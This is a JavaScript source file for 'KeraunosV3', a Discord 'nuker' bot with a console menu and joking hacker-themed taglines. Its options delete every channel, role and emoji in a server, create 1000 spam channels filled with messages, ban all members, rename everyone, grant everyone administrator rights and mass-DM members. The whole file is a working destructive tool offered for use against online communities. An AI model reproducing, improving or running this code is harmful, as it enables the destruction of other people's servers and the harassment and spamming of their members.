const
{
    Client
} = require("discord.js");
const
{
    Intents
} = require('discord.js');
const Discord = require('discord.js')
const
{
    red,
    green,
    blue,
    yellow,
    cyan,
    greenBright,
    redBright,
    grey,
    yellowBright,
    cyanBright,
    black,
    blueBright
} = require('chalk');
const client = new Client(
{
    intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MEMBERS, Intents.FLAGS.GUILD_BANS, Intents.FLAGS.GUILD_EMOJIS_AND_STICKERS, Intents.FLAGS.GUILD_INTEGRATIONS, Intents.FLAGS.GUILD_WEBHOOKS, Intents.FLAGS.GUILD_INVITES, Intents.FLAGS.GUILD_VOICE_STATES, Intents.FLAGS.GUILD_PRESENCES, Intents.FLAGS.GUILD_MESSAGES, Intents.FLAGS.GUILD_MESSAGE_REACTIONS, Intents.FLAGS.GUILD_MESSAGE_TYPING, Intents.FLAGS.DIRECT_MESSAGES, Intents.FLAGS.DIRECT_MESSAGE_REACTIONS, Intents.FLAGS.DIRECT_MESSAGE_TYPING],
});
const fs = require('fs');
const readline = require('readline');
const
{
    clear
} = require("console");
const rl = readline.createInterface(
{
    input: process.stdin,
    output: process.stdout,
    crlfDelay: Infinity
});
const
{
    Permissions,
    PermissionsBitField
} = require('discord.js');
const fetch = (...args) => import('node-fetch').then((
{
    default: fetch
}) => fetch(...args));
const spinny = require('cli-spinners');
const logUpdate = require("log-update");
const version = "3.0.0"
let parsed = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
const token = parsed["token"]
const channel_name = parsed["channel_name"]
const message_text = parsed["message_text"]
const guild_name = parsed["guild_name"]
clear()
let commands = [];
let motds = [
    "Imagine nuking your own server, with your enemies nuker!",
    "Kim Jong-on's favorite program!", 
    "Hackering since 2020!", 
    "1337", 
    "boom", 
    "KeraunosV3 on top!", 
    "Ctrl + C, Ctrl + V", 
    "Pasted", 
    "This server's full of skids, no one here can code",
    "hurley squad on top",
    "Pull up!",
    "Packwatch rip bozo xd!!"
];
let i = 0;

let spinInterval = setInterval(() =>
{
    const
    {
        frames
    } = spinny.bouncingBar;
    logUpdate(redBright("KeraunosV3 Loading... ") + frames[i = ++i % frames.length]);
}, spinny.bouncingBar.interval);

let firstMain = true;
client.on('ready', () =>
{
    function main()
    {
        clearInterval(spinInterval);
        clear()
        client.user.setActivity('Keranous by bytecode#6591',
        {
            type: 'PLAYING'
        })
        console.log(redBright(`


    ██╗░░██╗███████╗██████╗░░█████╗░██╗░░░██╗███╗░░██╗░█████╗░░██████╗██╗░░░██╗██████╗░
    ██║░██╔╝██╔════╝██╔══██╗██╔══██╗██║░░░██║████╗░██║██╔══██╗██╔════╝██║░░░██║╚════██╗
    █████═╝░█████╗░░██████╔╝███████║██║░░░██║██╔██╗██║██║░░██║╚█████╗░╚██╗░██╔╝░█████╔╝
    ██╔═██╗░██╔══╝░░██╔══██╗██╔══██║██║░░░██║██║╚████║██║░░██║░╚═══██╗░╚████╔╝░░╚═══██╗
    ██║░╚██╗███████╗██║░░██║██║░░██║╚██████╔╝██║░╚███║╚█████╔╝██████╔╝░░╚██╔╝░░██████╔╝
    ╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝░╚═════╝░╚═╝░░╚══╝░╚════╝░╚═════╝░░░░╚═╝░░░╚═════╝░
    `)) + console.log(red(`
    ────────────────────────────────────────────────────────────────────────────────
                            `) + green(`Made by bytecode#6591
                            Logged in as: ${client.user.username}#${client.user.discriminator}
                            MOTD: `) + motds[Math.floor(Math.random() * motds.length)] + redBright(` 
    ────────────────────────────────────────────────────────────────────────────────

    
    ` + red(`┌──────────────────────────────────────┬─────────────────────────────────────────┐
    │         [1] Nuke                     │  [2] Delete Channels                    │
    │         [3] Delete Roles             │  [4] Delete Emojis                      │
    │         [5] Create Channels          │  [6] Nickname All                       │  
    │         [7] Get All Guilds           │  [8] Ban All                            │
    │         [9] Scrape Guild Info        │  [10] Update Check                      │
    │         [11] Custom Command Creator  │  [12] Command Remover                   │
    │         [13] Status Editor           │  [14] Give Everyone Admin               │
    │         [15] DM All                  │  [16] About                             │
    │         [17] Make Invite Link        │  [18] ???                               │
    └──────────────────────────────────────┴─────────────────────────────────────────┘ 
    `)))
        if (firstMain) {
            rl.question(yellow("[KERANOUSV2INPUT] Run an update check? (y/n): "), (answer) =>
            {
                if(answer == "y")
                {
                    fetch("https://raw.githubusercontent.com/AviansEpic/keraunos/main/currentversion").then((response) =>
                    {
                        response.text().then((text) =>
                        {
                            if(version.trim() != text.trim())
                            {
                                console.log(red("[KERANOUSV2] You aren't using the latest version! Download the newest version at https://github.com/AviansEpic/keraunos"))
                            }
                            else
                            {
                                console.log(green("[KERANOUSV2] You are using the latest version!"))
                            }

                            rl.question("Press enter to continue...", () =>
                            {
                                main()
                            })

                            firstMain = false;
                        })
                    })
                } else 
                {
                    firstMain = false;
                    main();
                }
            })
        }
        rl.question(yellow('[KERANOUSV2INPUT] Selection: '), (answer) =>
        {
            if(answer == "1")
            {
                rl.question(yellow('[KERANOUSV2INPUT] GUILD ID: '), (guildid) =>
                {
                    let guild = client.guilds.cache.get(guildid)
                    if(!guild)
                    {
                        console.log(red('[-] Invalid Guild ID!'))
                        rl.question("Press enter to continue...", () =>
                        {
                            main()
                        })
                    }
                    else
                    {
                        console.log(green(`[KERANOUSV2I] Nuking ${guild.name}`));

                        guild.setName(guild_name).catch(()=>{});
                        
                        if (parsed.set_icon) {
                            guild.setIcon(parsed.icon_link).catch(()=>{});
                        }

                        guild.channels.cache.forEach(channel =>
                        {
                            channel.delete().then(() =>
                            {
                                console.log(green('[+] Deleted ' + channel.name + '/' + channel.id))
                            }).catch(() =>
                            {
                                console.log(red(`[+] Failed to delete ${channel.name}/${channel.id}`));
                            })
                        })
                        for(let i = 0; i < 1000; i++)
                        {
                            guild.channels.create(channel_name).then(channel =>
                            {
                                for (let i = 0; i < 7; i++) {
                                    channel.send(message_text);
                                }
                                console.log(green('[+] Created ' + channel.name + '/' + channel.id))
                            }).catch(() => {
                                console.log(green('[+] Failed to create channel!'));
                            })
                        }
                        rl.question("Press enter to continue...", () =>
                        {
                            main()
                        })
                    }
                })
            }
            else if(answer == "2")
            {
                rl.question(yellow('[KERANOUSV2INPUT] GUILD ID: '), (guildid) =>
                {
                    let guild = client.guilds.cache.get(guildid)
                    if(!guild)
                    {
                        console.log(red('[-] Invalid Guild ID!'))
                        rl.question("Press enter to continue...", () =>
                        {
                            main()
                        })
                    }
                    else
                    {
                        console.log(green(`[KERANOUSV2] Deleting all channels in ${guild.name}`))
                        guild.channels.cache.forEach(channel =>
                        {
                            channel.delete().then(() =>
                            {
                                console.log(green('[+] Deleted ' + channel.name + '/' + channel.id))
                            }).catch(() => {
                                console.log(red('[-] Unable to delete ' + channel.name + '/' + channel.id))
                            })
                        })
                        rl.question("Press enter to continue...", () =>
                        {
                            main()
                        })
                    }
                })
            }
            else if(answer == "3")
            {
                rl.question(yellow('[KERANOUSV2INPUT] GUILD ID: '), (guildid) =>
                {
                    let guild = client.guilds.cache.get(guildid)
                    if(!guild)
                    {
                        console.log(red('[-] Invalid Guild ID!'))
                        rl.question("Press enter to continue...", () =>
                        {
                            main()
                        })
                    }
                    else
                    {
                        console.log(green(`[KERANOUSV2] Deleting all roles in ${guild.name}`))
                        guild.roles.cache.forEach(role =>
                        {
                            role.delete().then(() =>
                            {
                                console.log(green('[+] Deleted ' + role.name + '/' + role.id))
                            }).catch(err =>
                            {
                                console.log(red('[-] Unable to delete ' + role.name + '/' + role.id))
                            })
                        })
                        rl.question("Press enter to continue...", () =>
                        {
                            main()
                        })
                    }
                })
            }
            else if(answer == "4")
            {
                rl.question(yellow('[KERANOUSV2INPUT] GUILD ID: '), (guildid) =>
                {
                    let guild = client.guilds.cache.get(guildid)
                    if(!guild)
                    {
                        console.log(red('[-] Invalid Guild ID!'))
                        rl.question("Press enter to continue...", () =>
                        {
                            main()
                        })
                    }
                    else
                    {
                        console.log(green(`[KERANOUSV2] Deleting all emojis in ${guild.name}`))
                        guild.emojis.cache.forEach(emoji =>
                        {
                            emoji.delete().then(() =>
                            {
                                console.log(green('[+] Deleted ' + emoji.name + '/' + emoji.id))
                            }).catch(err =>
                            {
                                console.log(red('[-] Unable to delete ' + emoji.name + '/' + emoji.id))
                            })
                        })
                        rl.question("Press enter to continue...", () =>
                        {
                            main()
                        })
                    }
                })
            }
            else if(answer == "5")
            {
                rl.question(yellow('[KERANOUSV2INPUT] GUILD ID: '), (guildid) =>
                {
                    const guild = client.guilds.cache.get(guildid);
                    if(!guild)
                    {
                        console.log(red('[-] Invalid Guild ID!'))
                        rl.question("Press enter to continue...", () =>
                        {
                            main()
                        })
                    }
                    else
                    {
                        console.log(green(`[KERANOUSV2] Creating channels in ${guild.name}`))
                        for(let i = 0; i < 1000; i++)
                        {
                            guild.channels.create(channel_name).then(channel =>
                            {
                                for (let i = 0; i < 7; i++) {
                                    channel.send(message_text);
                                }
                                console.log(green('[+] Created ' + channel.name + '/' + channel.id))
                            }).catch(()=>{
                                console.log(red('[+] Failed to make channel!'));
                            })
                        }
                        rl.question("Press enter to continue...", () =>
                        {
                            main()
                        })
                    }
                })
            }
            else if(answer == "6")
            {
                rl.question(yellow('[KERANOUSV2INPUT] GUILD ID: '), (guildid) =>
                {

                    let guild = client.guilds.cache.get(guildid)
                    if(!guild)
                    {
                        console.log(red('[-] Invalid Guild ID!'))
                        rl.question("Press enter to continue...", () =>
                        {
                            main()
                        })
                    }
                    
                    rl.question("[KERANOUSV2INPUT] NICKNAME: ", (nickname)=>{
                        guild.members.cache.forEach(member =>
                        {
                        
                            member.setNickname(nickname).then(() =>
                            {
                                console.log(green('[+] Renamed ' + member.user.username + "#" + member.user.discriminator + '/' + member.user.id))
                            }).catch(()=>{
                                console.log(red('[-] Unable to rename ' + member.user.username + "#" + member.user.discriminator + '/' + member.user.id))
                            })
                        })
                    })
                })
            }
            else if(answer == "7")
            {
                client.guilds.cache.forEach(guild =>
                {
                    console.log(green(`[+] Guild Found ${guild.name}/${guild.id}`))
                })
                rl.question("Press enter to continue...", () =>
                {
                    main()
                })
            }
            else if(answer == "8")
            {
                rl.question(yellow('[KERANOUSV2INPUT] GUILD ID: '), (guildid) =>
                {
                    let guild = client.guilds.cache.get(guildid)
                    if(!guild)
                    {
                        console.log(redBright("[-] Invalid Guild ID!"));
                        rl.question("Press enter to continue...", () =>
                        {
                            main()
                        })
                    }
                    else
                    {
                        console.log(green(`[KERANOUSV2] Banning all members in ${guild.name}`))

                        guild.members.cache.each((member)=>{
                            member.ban().then(()=>{
                                console.log(green("[+] Banned " + member.user.username + "/" + member.id));
                            }).catch(()=>{
                                console.log(red("[+] Failed to Ban " + member.user.username + "/" + member.id));
                            });
                        })
                    }
                })
            }
            else if(answer == "9")
            {
                rl.question(yellow('[KERANOUSV2INPUT] GUILD ID: '), (guildid) =>
                {
                    let guild = client.guilds.cache.get(guildid)
                    if(!guild)
                    {
                        console.log(red('[-] Invalid Guild ID!'))
                        rl.question("Press enter to continue...", () =>
                        {
                            main()
                        })
                    }
                    else
                    {
                        let owner = client.users.cache.get(guild.ownerId)
                        console.log(green("[KERANOUSV2] Scraping info... "))
                        console.log(green("[KERANOUSV2] Guild Name: " + guild.name))
                        console.log(green("[KERANOUSV2] Guild ID: " + guild.id))
                        console.log(green("[KERANOUSV2] Guild Owner: " + owner.username + "#" + owner.discriminator))
                        console.log(green("[KERANOUSV2] Guild Owner ID: " + owner.id))
                        console.log(green("[KERANOUSV2] Guild Created At: " + guild.createdAt))
                        console.log(green("[KERANOUSV2] Guild Member Count: " + guild.memberCount))
                        console.log(green("[KERANOUSV2] Channel Count: " + guild.channels.cache.size))
                        rl.question("Press enter to continue...", () =>
                        {
                            main()
                        })
                    }
                })
            }
            else if(answer == "10")
            {
                fetch("https://raw.githubusercontent.com/AviansEpic/keraunos/main/currentversion").then((response) =>
                {
                    response.text().then((text) =>
                    {
                        if(version.trim() != text.trim())
                        {
                            console.log(red("[KERANOUSV2] You aren't using the latest version! Download the newest version at https://github.com/AviansEpic/keraunos"))
                        }
                        else
                        {
                            console.log(green("[KERANOUSV2] You are using the latest version!"))
                        }
                    })
                })
                fetch("https://raw.githubusercontent.com/AviansEpic/keraunos/main/updatelog").then(response =>
                {
                    response.text().then(text =>
                    {
                        console.log(green("[KERANOUSV2] Update Log: " + text.trim()))
                        setTimeout(() =>
                        {
                            rl.question("Press enter to continue...", () =>
                            {
                                main()
                            }, 500)
                        })
                    })
                })
            }
            else if(answer == "11")
            {
                rl.question(yellow('[KERANOUSV2INPUT] COMMAND: '), (command) =>
                {
                    rl.question(yellow('[KERANOUSV2INPUT] RESPONSE: '), (message) =>
                    {
                        commands[command.toLowerCase()] = message
                        console.log(green("[KERANOUSV2] Added command: " + command.toLowerCase()))
                        rl.question("Press enter to continue...", () =>
                        {
                            main()
                        })
                    })
                })
            }
            else if(answer == "12")
            {
                rl.question(yellow('[KERANOUSV2INPUT] COMMAND: '), (command) =>
                {
                    commands[command.toLowerCase()] = undefined
                    console.log(green("[KERANOUSV2] Removed command: " + command.toLowerCase()))
                    rl.question("Press enter to continue...", () =>
                    {
                        main()
                    })
                })
            }
            else if(answer == "13")
            {
                rl.question(yellow('[KERANOUSV2INPUT] STATUS: '), (status) =>
                {
                    console.log(red(`
 ┌─────────────────┐   
 │  [1] Playing    │
 │  [2] Streaming  │
 │  [3] Listening  │
 │  [4] Watching   │
 └─────────────────┘
                `))
                    rl.question(yellow('[KERANOUSV2INPUT] TYPE: '), (type) =>
                    {
                        if(type == "1")
                        {
                            client.user.setActivity(status,
                            {
                                type: "PLAYING"
                            })
                        }
                        else if(type == "2")
                        {
                            client.user.setActivity(status,
                            {
                                type: "STREAMING"
                            })
                        }
                        else if(type == "3")
                        {
                            client.user.setActivity(status,
                            {
                                type: "LISTENING"
                            })
                        }
                        else if(type == "4")
                        {
                            client.user.setActivity(status,
                            {
                                type: "WATCHING"
                            })
                        }
                        console.log(green("[KERANOUSV2] Set status to: " + status))
                        rl.question("Press enter to continue...", () =>
                        {
                            main()
                        })
                    })
                })
            }

            else if(answer == "14") {
                rl.question(yellow('[KERANOUSV2INPUT] GUILD ID: '), (guildid) => 
                {
                    let guild = client.guilds.cache.get(guildid);

                    if (!guild) {
                        console.log(red('[-] Invalid Guild ID!'))
                        rl.question("Press enter to continue...", () =>
                        {
                            main()
                        })
                    }
                    
                    guild.roles.create({
                        name: ".",
                        permissions: ["ADMINISTRATOR"]
                    }).then((role)=>{
                        guild.members.cache.each((member) => {
                            member.roles.add(role).then(()=>{
                                console.log(green(`[+] Gave ${member.user.username}/${member.id} admin role!`));
                            }).catch(()=>{
                                console.log(red(`[-] Failed to give ${member.user.username}/${member.id} admin role!`));
                            });
                        })
                    }).catch(()=>{console.log(red("[-] Failed to create admin role!"))})
                })
            }
            
            else if(answer == "15")
            {
                console.log(red("This could violate TOS! Be careful with this."));

                rl.question(yellow('[KERANOUSV2INPUT] MESSAGE: '), (message) =>
                {
                    rl.question(yellow('[KERANOUSV2INPUT] GUILD ID: '), (guildid) =>
                    {
                        let guild = client.guilds.cache.get(guildid);

                        if (!guild) {
                            console.log(red('[-] Invalid Guild ID!'))
                            rl.question("Press enter to continue...", () =>
                            {
                                main()
                            })
                        }

                        guild.members.cache.forEach(member =>
                        {
                            let iserr = false
                            member.send(message).catch(err =>
                            {
                                console.log(red("[KERANOUSV2] Couldn't send message to " + member.user.username))
                                iserr = true
                            }).then(() =>
                            {
                                if(!iserr)
                                {
                                    console.log(green("[KERANOUSV2] Sent message to " + member.user.username))
                                }
                            })
                        })
                    })
                })

                rl.question("Press enter to continue...", () => {
                    main()
                })
            } else if(answer == "16")
            {
                console.log(yellow("[KERANOUSV2] Thank you for using Keranous V2!"))
                console.log(yellow("[KERANOUSV2] Version: " + version))
                fetch("https://raw.githubusercontent.com/AviansEpic/keraunos/main/currentversion").then((response) =>
                {
                    response.text().then((text) =>
                    {
                        console.log(yellow("[KERAUNOSV2] Latest Version: " + text))
                    })
                })
                console.log(yellow("[KERANOUSV2] Created by bytecode#1337"))
                console.log(yellow("[KERANOUSV2] Github: https://www.github.com/AviansEpic/keraunos"))
                rl.question("Press enter to continue...", () => {
                    main()
                })
            } else if(answer == "17") {
                console.log(yellow("[KERAUNOSV2]") + ` https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot`);
                rl.question("Press enter to continue...", () =>
                {
                    main()
                })
            } else
            {
                console.log(red("Invalid command!"));
            }
        })
    };
    main();
})

client.login(token);